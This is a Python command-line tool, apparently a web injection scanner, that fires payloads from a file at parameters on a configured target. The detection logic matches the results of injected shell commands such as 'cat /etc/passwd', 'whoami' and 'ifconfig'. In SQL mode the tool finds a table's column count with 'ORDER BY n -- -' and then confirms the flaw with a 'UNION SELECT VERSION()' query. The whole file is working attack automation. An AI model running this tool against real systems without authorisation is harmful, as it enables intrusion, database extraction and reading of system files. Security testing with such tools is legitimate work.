from config import *
import requests
import os
from datetime import datetime
import itertools
import re
import click

def write_vulnerabilty_report(vulnerabilities_lines):
    """
    it writes text inside the output file. If the file and directories don't exist it creates them.
    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    """

    directories, filename = os.path.split(VULNERABILITY_OUTPUT_PATH)

    if not os.path.exists(directories):
        os.makedirs(directories)

    with open(VULNERABILITY_OUTPUT_PATH, 'a+') as f:
        for message in vulnerabilities_lines:
            f.write(f'{message}\n')

def elaborate_response(http_method, url_under_test, parameters_and_values, response, vulnerabilities_lines, confirmation_data=None, extra_message=None):
    """
    it elaborates the response and checks for vulnerabilities. If a vulnerability is found then a new line will be saved to be written inside the output file.
    :param http_method: HTTP metod
    :param url_under_test: server resource name
    :param parameters_and_values: dictionary containing (parameter_name, paramater_value) as (key, value)
    :param response: HTTP response
    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    :param confirmation_data: confirmation data used to confirm a vulnerability found using the number of columns command, None if the request wasn't a confirmation request
    :param extra_message: details to append to the message, None if the request wasn't a confirmation request
    :return: number of columns in a table if the ORDER BY command index is out of range, None otherwise
    """
    
    url_under_test = url_under_test[1:] # remove initial slash

    if DEBUG:
        if confirmation_data:
            print('[DEBUG] - STARTING VULNERABILITY CONFIRMATION')

        print(f'\n[DEBUG] - URL: {url_under_test}')
        print(f'[DEBUG] - HTTP METHOD: {http_method}')
        print(f'[DEBUG] - COMPLETE URL: {response.url}')
        print(f'[DEBUG] - PARAMETERS AND VALUES: {confirmation_data if confirmation_data else parameters_and_values}')
        
        print('[DEBUG] - RESPONSE')
        print(response.text)

    number_of_columns = None

    for parameter, value in parameters_and_values.items():
        message = f'Found a command injection for URL: {url_under_test}, HTTP method: {http_method}, parameter: {parameter}, payload: {value}'

        if extra_message:
            message += extra_message
        
        # skip already checked combination
        if message in vulnerabilities_lines:
            continue

        vulnerable = False

        # if the request was a confirmation request
        if confirmation_data:
            vulnerable = len(re.findall('[\'"1] ORDER BY \d+ -- -', value)) > 0 # vulnerability is confirmed for each ORDER BY parameter value
        else:
            # check expected results
            if 'ls' in value:
                if url_under_test in response.text:
                    vulnerable = True
            elif 'cat /etc/passwd' in value:
                if 'root' in response.text:
                    vulnerable = True
            elif ('head' in value or 'grep php' in value) and '.php' in value:
                if '<?php' in response.text:
                    vulnerable = True
            elif 'whoami' in value:
                if CURRENT_USER in response.text:
                    vulnerable = True
            elif 'ifconfig | grep inet' in value:
                if 'inet' in response.text:
                    vulnerable = True
            elif re.findall('[\'"1] ORDER BY \d+ -- -', value): # if the payload contais command to find the number of columns
                if not response.text and 500 == response.status_code: # response is empty if column number is out of range
                    columns_number = int(re.findall('\d+', value)[-1])-1 # correct columns number = previous
                    return columns_number

        if vulnerable:
            print(message)
            vulnerabilities_lines.append(f'{datetime.now()} - {message}')

    if DEBUG and confirmation_data:
        print('[DEBUG] - VULNERABILITY CONFIRMATION FINISHED')

    return number_of_columns

def read_requests_details(requests_file, requests_dict):
    """
    it reads the requests details file and saves data inside a dictionary.
    :param requests_file: input file containing the details
    :param requests_dict: dictionary containing the details
    """
    
    with open(requests_file) as f:
        for line in f:
            values = line.strip().split(REQUESTS_SPLIT_VAL)

            requests_dict.append({ 
                'method':  values[0],
                'url': values[1],
                'parameters': values[2].split(REQUESTS_PARAMETERS_SPLIT_VAL),
            })

def read_payloads(payloads_file, requests_dict):
    """
    it reads the payloads file and saves data inside a dictionary.
    :param requests_file: input file containing the payloads
    :param requests_dict: dictionary containing the details
    :exception ValueError: if more payloads are specified and the payloads list contains the command to find the columns number
    :exception IndexError: if the length of the files is not the same
    """

    with open(payloads_file) as f:          
        i = 0

        for line in f:
            payloads = line.strip().split(PAYLOADS_SPLIT_VAL)

            # can't inject other payload with the command to find the columns number
            if len(payloads) > 1 and payloads[i].startswith(COMMAND_COLUMNS_NUMBER):
                print(f'Only one payload can be injected with the {COMMAND_COLUMNS_NUMBER} command')
                raise ValueError()

            requests_dict[i]['payloads'] = payloads
            i += 1

        if i != len(requests_dict):
            raise IndexError()

def send_request(http_method, data, final_url):
    """
    it sends an HTTP request based on a specific HTTP method.
    :param http_method: HTTP metod
    :param data: data to be sent
    :param final_url: url containing target and resource
    :return: HTTP response
    :exception ValueError: if HTTP method is not supported
    """
    
    if 'GET' == http_method.upper():
        return requests.get(final_url, params=data)
    
    if 'POST' == http_method.upper():
        return requests.post(final_url, data=data)

    print(f'Method {http_method} is not supported. Check your input file')
    raise ValueError

def send_confirmation_request(original_request_data, number_of_columns, request_details, payloads_permutation, pre_union_value, vulnerabilities_lines):
    """
    it sends an HTTP request in order to confirm if a query is vulnerable. If the vulnerability is confirmed a new line will be saved to be written inside the output file.
    :param original_request_data: data sent on the original request
    :param number_of_columns: number of columns found by injecting the ORDER BY command
    :param request_details: details of the request
    :param payloads_permutation: payloads to inject
    :param pre_union_value: char to prepend to the UNION command
    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    :return: true if the vulnerability is confirmed, false otherwise
    """

    columns_values = ['VERSION()']

    for _ in range(1, number_of_columns): # skip a column, first one is replaced by the version command
        columns_values.append('NULL') # NULL allows to avoid type errors

    # use set to remove repetitions
    for column_value in set(itertools.permutations(columns_values, number_of_columns)):
        confirmation_query = 'UNION SELECT '

        for column_val in column_value:
            confirmation_query += f'{column_val}, '
    
        confirmation_query = confirmation_query[:-2] # remove extra chars

        confirmation_data = { }

        for i in range(len(request_details['parameters'])):
            if COMMAND_COLUMNS_NUMBER == payloads_permutation[i]:
                confirmation_data[request_details['parameters'][i]] = f'{pre_union_value} {confirmation_query} -- -'
            else:
                confirmation_data[request_details['parameters'][i]] = payloads_permutation[i]

        response = send_request(request_details['method'], confirmation_data, TARGET + request_details['url'])

        if re.findall('\d.\d.[\d.]+', response.text): # if the response contains a version format string then the vulnerability is confirmed
            extra_message = f'. The table has {number_of_columns} column(s)'

            # use original data to write output file
            elaborate_response(request_details['method'], request_details['url'], original_request_data, response, vulnerabilities_lines, confirmation_data, extra_message)
            return True

    return False

def prepare_data_and_send_request(requests_dict, vulnerabilities_lines, is_sql_run):
    """
    it prepares data and send an HTTP request for cmd and sql mode.
    :param requests_dict: dictionary containing the details
    :param vulnerabilities_lines: list of lines containing vulnerabilities to write inside the output file
    :param is_sql_run: boolean used to run the code in sql or cmd mode
    """
    
    for request in requests_dict:
        final_url = TARGET + request['url']

        # if at least one parameter hasn't a payload  
        if len(request['parameters']) > len(request['payloads']):
            for _ in range(len(request['parameters']) - len(request['payloads'])):
                request['payloads'].append('valid_string') # append a valid value for each parameter 

        # set current ORDER BY value
        current_column_number = 1

        # used to prepend char in ORDER BY command
        pre_order_by_values = ['\'', '"', '1']

        while True:
            end_loop = False

            noc_command_in_payloads = COMMAND_COLUMNS_NUMBER in request['payloads']

            # permutations of payloads based on parameters length
            for payload in set(itertools.permutations(request['payloads'], len(request['parameters']))):
                # if payload contains the command to find the number of columns and the run is set to sql mode 
                if noc_command_in_payloads and is_sql_run:
                    for pre_order_by_value in pre_order_by_values[:]: # loop over a copy of the list because elements can be removed
                        data = { }
                        
                        for i in range(len(request['parameters'])):
                            if COMMAND_COLUMNS_NUMBER == payload[i]:
                                data[request['parameters'][i]] = f'{pre_order_by_value} ORDER BY {current_column_number} -- -'
                            else:
                                data[request['parameters'][i]] = payload[i]

                        response = send_request(request['method'], data, final_url)

                        if 404 == response.status_code:
                            print(f'FILE NOT FOUND: {request["url"]}')                            
                            end_loop = True
                            break

                        number_of_columns = elaborate_response(request['method'], request['url'], data, response, vulnerabilities_lines)

                        # type or quotes error
                        if 0 == number_of_columns:
                            pre_order_by_values.remove(pre_order_by_value) # remove invalid char
                        elif number_of_columns: # if the number of columns is found, send a confirmation request
                            end_loop = send_confirmation_request(data, number_of_columns, request, payload, pre_order_by_value, vulnerabilities_lines)
                            
                        # found and confirmed number of columns
                        if end_loop:
                            break
                else: # simply inject commands
                    data = { }
                    
                    for i in range(len(request['parameters'])):
                        data[request['parameters'][i]] = payload[i]
                    
                    response = send_request(request['method'], data, final_url)

                    if 404 == response.status_code:
                        print(f'FILE NOT FOUND: {request["url"]}')
                        break
                    
                    elaborate_response(request['method'], request['url'], data, response, vulnerabilities_lines)

                if end_loop:
                    break

            # found and confirmed number of columns
            if end_loop or not noc_command_in_payloads:
                break

            current_column_number += 1

@click.command()
@click.option('--mode', '-m', help='Injection mode [sql, cmd]', type=click.Choice(['sql', 'cmd']), required=True)
@click.option('--irequests', '-r', help='Requests details file', required=True)
@click.option('--ipayloads', '-p', help='Payloads file', required=True)
def main(mode, irequests, ipayloads):
    requests_dict = [ ]

    try:
        read_requests_details(irequests, requests_dict)
        read_payloads(ipayloads, requests_dict)
    
        if DEBUG:
            print('[DEBUG] - REQUESTS DICTIONARY')
            print(requests_dict)

        vulnerabilities_lines = [ ]

        prepare_data_and_send_request(requests_dict, vulnerabilities_lines, 'sql' == mode)
        write_vulnerabilty_report(vulnerabilities_lines)
    except ValueError:
        exit()
    except IndexError:
        print('Error: mismatching rows number between requests details and payloads files')
        exit()
    except FileNotFoundError:
        print('Error: file not found. Check command-line options')

if __name__ == '__main__':
    main()